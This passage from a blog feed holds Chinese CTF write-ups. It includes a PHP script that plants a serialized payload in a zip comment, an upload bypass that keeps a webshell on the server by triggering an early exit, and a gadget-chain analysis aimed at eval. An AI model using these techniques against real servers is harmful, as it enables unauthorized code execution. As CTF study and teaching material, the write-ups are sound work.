</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;xxx = <span class="keyword">new</span> <span class="title function_ invoke__">air</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">banana</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$act</span> = <span class="string">&#x27;SplFileObject&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> tree;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar_file</span> = <span class="title function_ invoke__">serialize</span>([<span class="variable">$a</span>, <span class="number">1</span>]);</span><br><span class="line"><span class="variable">$tmp</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;i:1;i:1;&quot;</span>, <span class="string">&quot;i:0;i:1;&quot;</span>, <span class="variable">$phar_file</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$zip</span> = <span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="string">&#x27;shamate.zip&#x27;</span>, <span class="title class_">ZipArchive</span>::<span class="variable constant_">CREATE</span>); </span><br><span class="line"><span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;crispr.txt.txt&#x27;</span>, <span class="string">&#x27;file content goes here&#x27;</span>);</span><br><span class="line"><span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">setArchiveComment</span>(<span class="variable">$tmp</span>);</span><br><span class="line"><span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br></pre></td></tr></table></figure><p>题目里还有个waf检测文件内容，此时用十六进制查看器打开能发现压缩注释还都是明文的，拿捏了属于是</p><p><img src="/images/BUU/20220529234413.png"></p><p>一次不够，两次来凑，用<code>gzip</code>命令再次压缩</p><p><img src="/images/BUU/20220529234755.png"></p><p>嗯，感觉好door了</p><h1 id="ezip"><a href="#ezip" class="headerlink" title="ezip"></a>ezip</h1><p>这题真大，这题真白（指色图当首页</p><p>很快啊，我一个滑铲直接down进收藏夹prprpr</p><p>pr未半而觉味道不正，十六进制编辑器打开在文件末尾找到了源码（misb实锤</p><p>换句话说，其实这道题就算黑盒也是ok的，核心都是对php原生类<strong>ZipArchive</strong>的考察。</p><p><strong>upload.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;zip.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;..&quot;</span>)||<span class="title function_ invoke__">strstr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;/&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION)!=<span class="string">&quot;zip&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;only zip!!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$Myzip</span> = <span class="keyword">new</span> <span class="title function_ invoke__">zip</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$Myzip</span>-&gt;path);</span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;./&#x27;</span>.<span class="variable">$Myzip</span>-&gt;path.<span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to unzip your zip to /&quot;</span>.<span class="variable">$Myzip</span>-&gt;path.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$Myzip</span>-&gt;<span class="title function_ invoke__">unzip</span>())&#123;<span class="keyword">echo</span> <span class="string">&quot;Success&quot;</span>;&#125;<span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="string">&quot;failed&quot;</span>;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>zip.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">zip</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$zip_name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$zip_manager</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$zip_name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;zip_manager = <span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;path = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">gen_path</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;zip_name = <span class="variable">$zip_name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">gen_path</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$chars</span>=<span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>;</span><br><span class="line">        <span class="variable">$newchars</span>=<span class="title function_ invoke__">str_split</span>(<span class="variable">$chars</span>);</span><br><span class="line">        <span class="title function_ invoke__">shuffle</span>(<span class="variable">$newchars</span>);</span><br><span class="line">        <span class="variable">$chars_key</span>=<span class="title function_ invoke__">array_rand</span>(<span class="variable">$newchars</span>,<span class="number">15</span>);</span><br><span class="line">        <span class="variable">$fnstr</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">15</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">            <span class="variable">$fnstr</span>.=<span class="variable">$newchars</span>[<span class="variable">$chars_key</span>[<span class="variable">$i</span>]];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$fnstr</span>.<span class="title function_ invoke__">time</span>().<span class="title function_ invoke__">microtime</span>()*<span class="number">100000</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">deldir</span>(<span class="params"><span class="variable">$dir</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment">//先删除目录下的文件：</span></span><br><span class="line">        <span class="variable">$dh</span> = <span class="title function_ invoke__">opendir</span>(<span class="variable">$dir</span>);</span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$file</span> = <span class="title function_ invoke__">readdir</span>(<span class="variable">$dh</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$file</span> != <span class="string">&quot;.&quot;</span> &amp;&amp; <span class="variable">$file</span>!=<span class="string">&quot;..&quot;</span>) &#123;</span><br><span class="line">                <span class="variable">$fullpath</span> = <span class="variable">$dir</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$file</span>;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$fullpath</span>)) &#123;</span><br><span class="line">                    <span class="title function_ invoke__">unlink</span>(<span class="variable">$fullpath</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">deldir</span>(<span class="variable">$fullpath</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">closedir</span>(<span class="variable">$dh</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">dir_list</span>(<span class="params"><span class="variable">$directory</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$array</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$dir</span> = <span class="title function_ invoke__">dir</span>(<span class="variable">$directory</span>);</span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$file</span> = <span class="variable">$dir</span>-&gt;<span class="title function_ invoke__">read</span>()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&#x27;.&#x27;</span> &amp;&amp; <span class="variable">$file</span> !== <span class="string">&#x27;..&#x27;</span>) &#123;</span><br><span class="line">                <span class="variable">$array</span>[] = <span class="variable">$file</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$array</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unzip</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$fullpath</span> = <span class="string">&quot;/var/www/html/&quot;</span>.<span class="variable language_">$this</span>-&gt;path.<span class="string">&quot;/&quot;</span>.<span class="variable language_">$this</span>-&gt;zip_name;</span><br><span class="line">        <span class="variable">$white_list</span> = [<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>,<span class="string">&#x27;bmp&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;zip_manager-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$fullpath</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="variable language_">$this</span>-&gt;zip_manager-&gt;<span class="title function_ invoke__">count</span>();<span class="variable">$i</span> ++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$this</span>-&gt;zip_manager-&gt;<span class="title function_ invoke__">getNameIndex</span>(<span class="variable">$i</span>),<span class="string">&quot;../&quot;</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you bad bad&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;zip_manager-&gt;<span class="title function_ invoke__">extractTo</span>(<span class="variable">$this</span>-&gt;path))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Unzip to /&quot;</span>.<span class="variable language_">$this</span>-&gt;path.<span class="string">&quot;/ failed&quot;</span>;</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        @<span class="title function_ invoke__">unlink</span>(<span class="variable">$fullpath</span>);</span><br><span class="line">        <span class="variable">$file_list</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">dir_list</span>(<span class="string">&quot;/var/www/html/&quot;</span>.<span class="variable">$this</span>-&gt;path.<span class="string">&quot;/&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">sizeof</span>(<span class="variable">$file_list</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">is_dir</span>(<span class="variable">$this</span>-&gt;path.<span class="string">&quot;/&quot;</span>.<span class="variable">$file_list</span>[<span class="variable">$i</span>]))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;dir? I deleted all things in it&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;@<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">deldir</span>(<span class="string">&quot;/var/www/html/&quot;</span>.<span class="variable">$this</span>-&gt;path.<span class="string">&quot;/&quot;</span>.<span class="variable">$file_list</span>[<span class="variable">$i</span>]);@<span class="title function_ invoke__">rmdir</span>(<span class="string">&quot;/var/www/html/&quot;</span>.<span class="variable">$this</span>-&gt;path.<span class="string">&quot;/&quot;</span>.<span class="variable">$file_list</span>[<span class="variable">$i</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file_list</span>[<span class="variable">$i</span>], PATHINFO_EXTENSION),<span class="variable">$white_list</span>)) &#123;<span class="keyword">echo</span> <span class="string">&quot;only image!!! I deleted it for you&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;/var/www/html/&quot;</span>.<span class="variable">$this</span>-&gt;path.<span class="string">&quot;/&quot;</span>.<span class="variable">$file_list</span>[<span class="variable">$i</span>]);&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果没有随机目录名的话还可以考虑条件竞争的说。</p><p>这道题的关键在</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;zip_manager-&gt;<span class="title function_ invoke__">extractTo</span>(<span class="variable">$this</span>-&gt;path))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Unzip to /&quot;</span>.<span class="variable language_">$this</span>-&gt;path.<span class="string">&quot;/ failed&quot;</span>;</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个<code>exit</code>就很灵性，注意删除非指定后缀文件的操作也在它后面</p><p>此时思路就很明确啦，上传一个包含多个文件的压缩包，马放在前面，后面放能让解压过程出错的文件，就能提前<code>exit</code>，让马留在上传点了。</p><p>本地实验时对压缩包本体下手还不太好操作，一不小心就把压缩包整坏了，文件校验都过不去，更别说解压文件了。当然不是说直接动压缩包本体就一定不行，只是在对压缩包文件结构不熟的情况下难度可能有些大了的说。</p><p>转换下思路，从待解压的文件上下手，动内容是没有多大意义的，因此只剩下文件名了。</p><p>压缩包里放马之后再添加文件<code>/////.png</code>，内容不重要，重要的是这个文件名不能被php的<strong>ZipArchive</strong>正常解析，再加上有逻辑漏洞的后端代码，就共同组成了这道题的漏洞。</p><p>蚁剑连上webshell后发现不能直接读flag，开虚拟终端操作一下</p><p><img src="/images/BUU/20220530220010.png"></p><h1 id="NodeSoEasy"><a href="#NodeSoEasy" class="headerlink" title="NodeSoEasy"></a>NodeSoEasy</h1><p><strong>app.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>()</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">5000</span></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extended</span>: <span class="literal">true</span>&#125;)).<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>())</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span>= (<span class="params">target, source</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> target = &#123;&#125;</span><br><span class="line">    <span class="keyword">var</span> source = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(req.<span class="property">body</span>))</span><br><span class="line">    <span class="title function_">merge</span>(target, source)</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`listening on port <span class="subst">$&#123;port&#125;</span>`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>一眼<code>merge</code>和<code>ejs</code>，鉴定为：纯纯的原型链污染和模板注入</p><p>原型链污染这里就不展开了（太美丽了原型链污染），看看远方的<code>ejs</code>模板RCE吧佳人们</p><p>题目给出了完整的后端源码，在本地进行跟踪调试</p><p><img src="https://www.m0x01sery.com/img/20220726183354.png"></p><h1 id="Really-Easy-SQL"><a href="#Really-Easy-SQL" class="headerlink" title="Really Easy SQL"></a>Really Easy SQL</h1><h1 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h1>]]></content>
    
    
    <summary type="html">&lt;p&gt;考试周（x）考试月（✓）&lt;/p&gt;
&lt;p&gt;某运会干的好事&lt;/p&gt;
&lt;p&gt;延期了明年还得再体验一回&lt;/p&gt;
&lt;p&gt;上个大学怎么这么多事（半恼&lt;/p&gt;</summary>
    
    
    
    
    <category term="php" scheme="https://www.m0x01sery.com/tags/php/"/>
    
    <category term="upload" scheme="https://www.m0x01sery.com/tags/upload/"/>
    
    <category term="python" scheme="https://www.m0x01sery.com/tags/python/"/>
    
    <category term="sql" scheme="https://www.m0x01sery.com/tags/sql/"/>
    
    <category term="ssti" scheme="https://www.m0x01sery.com/tags/ssti/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF X FATE 四月防疫挑战赛 web1 &amp; web2</title>
    <link href="https://www.m0x01sery.com/2022/04/28/DASCTF-FATE/"/>
    <id>https://www.m0x01sery.com/2022/04/28/DASCTF-FATE/</id>
    <published>2022-04-27T16:00:00.000Z</published>
    <updated>2022-04-28T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="warmup-php"><a href="#warmup-php" class="headerlink" title="warmup-php"></a>warmup-php</h1><p><a href="https://files.buuoj.cn/files/45743698d2fda6f2ee15021bcb38f6f4/2.zip">题目附件</a>给了四个<code>class</code>源码文件，<code>Base</code>，<code>Filter extends Base</code>，<code>ListView extends Base</code>，<code>TestView extends ListView</code></p><span id="more"></span><p>首先在<code>Base</code>类中找到漏洞点</p><p><img src="/images/BUU/20220427220530.png"></p><p>似乎有<code>eval()</code>和<code>call_user_func_array()</code>两个方向，也不清楚哪个能打通的说</p><p>回头看入口文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">spl_autoload_register</span>(function(<span class="variable">$class</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require</span>(<span class="string">&quot;./class/&quot;</span>.<span class="variable">$class</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="variable">$properties</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;properties&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Action</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$action</span>,<span class="variable">$properties</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$object</span>=<span class="keyword">new</span> <span class="variable">$action</span>();</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$properties</span> <span class="keyword">as</span> <span class="variable">$name</span>=&gt;<span class="variable">$value</span>)</span><br><span class="line">            <span class="variable">$object</span>-&gt;<span class="variable">$name</span>=<span class="variable">$value</span>;</span><br><span class="line">        <span class="variable">$object</span>-&gt;<span class="title function_ invoke__">run</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Action</span>(<span class="variable">$action</span>,<span class="variable">$properties</span>);</span><br></pre></td></tr></table></figure><p>开幕日常被自己菜醒〔指一堆函数没见过</p><p><code>spl_autoload_register()</code>函数和<code>__autoload()</code>有异曲同工之妙，多用于动态调用类的场合</p><p>当php引擎第一次使用类<code>A</code>，但是找不到时，会自动调用<code>__autoload()</code>方法，并将类名<code>A</code>作为参数传入。</p><p><code>spl_autoload_register()</code>不会像<code>__autoload()</code>一样自动触发，它只会告诉php引擎一声，要是碰到未定义的类，就中途去执行由参数指定的函数后再继续。这里的函数就多是起<code>require()</code>系列的作用了。</p><p>接下来让传两个参数，<code>action</code>作为将要被实例化的类，<code>properties</code>为一个数组，暂时不知道如何构造，先放着</p><p>又因为<code>TestView</code>类是最终的继承类，拿来实例化再合适不过了的说。</p><p>搜索源码含有<code>run()</code>方法的类，定位到了<code>ListView</code>，从此开始跟进函数调用链</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ListView::run</span><br><span class="line">ListView::renderContent</span><br><span class="line">ListView::renderSection</span><br><span class="line">TestView::renderTableBody</span><br><span class="line">TestView::renderTableRow</span><br><span class="line">Base::evaluateExpression</span><br></pre></td></tr></table></figure><p><strong>ListView::renderContent</strong></p><p><img src="/images/BUU/20220427221752.png"></p><p><code>ob()</code>系列函数是对浏览器输出缓冲区的操作。</p><blockquote><p>ob缓存介绍<br>ob是output buffering的简称，输出缓冲区，缓冲区是通过php.ini中的output_buffering变量控制的。其默认值是off,可以设置为on来打开buffer。打来buffer后，即便程序中没有用ob函数，实际上代码也是使用了缓冲区的。另外，不管php.ini中output_buffering的设置，cli模式下的php始终默认是关闭的。为什么要设计缓冲区呢？简单来说，高速的cpu早早处理完自己的数据，想通过线路传递给用户，但是线路太窄了，一下输送不过去。如果引入缓冲区，cpu可以将快速将生成的数据放入缓冲区，然后自己哪儿凉快儿哪儿呆着歇着去了。缓冲区根据指令适时将数据输出。这个样就合理解决了高速cpu与低速I/O设备的矛盾了。</p><p>ob的基本原则<br>如果ob缓存打开，则echo的数据首先放在ob缓存。如果是header信息，直接放在程序缓存。当页面执行到最后，会把ob缓存的数据放到程序缓存，然后依次返回给浏览器。</p><p>ob的基本作用：<br>1)防止在浏览器有输出之后再使用setcookie()、header()或session_start()等发送头文件的函数造成的错误。其实这样的用法少用为好，养成良好的代码习惯。<br>2)捕捉对一些不可获取的函数的输出，比如phpinfo()会输出一大堆的HTML，但是我们无法用一个变量例如$info=phpinfo();来捕捉，这时候ob就管用了。<br>3)对输出的内容进行处理，例如进行gzip压缩，例如进行简繁转换，例如进行一些字符串替换。<br>4)生成静态文件，其实就是捕捉整页的输出，然后存成文件。经常在生成HTML，或者整页缓存中使用。</p></blockquote><p><code>preg_replace_callback()</code>函数会执行一个正则表达式加工这里的<code>$this-&gt;template</code>，之后将其作为参数传入一个回调函数（此处为<code>$this-&gt;renderSection</code>）进行处理。</p><blockquote><p>这个函数的行为除了可以指定一个 callback 替代 replacement 进行替换字符串的计算，其他方面等同于 preg_replace()。</p><p>如果待匹配目标是一个数组，返回值将也是一个数组，其他情况返回字符串。错误发生时返回NULL。如果查找到了匹配，返回替换后的目标字符串（或字符串数组），其他情况将会无变化返回。</p></blockquote><p><strong>ListView::renderSection</strong></p><p><img src="/images/BUU/20220428111302.png"></p><p>通常这里的<code>$matches[0]</code>保存的是匹配到的片段，<code>$matches[1]</code>是第一个<a 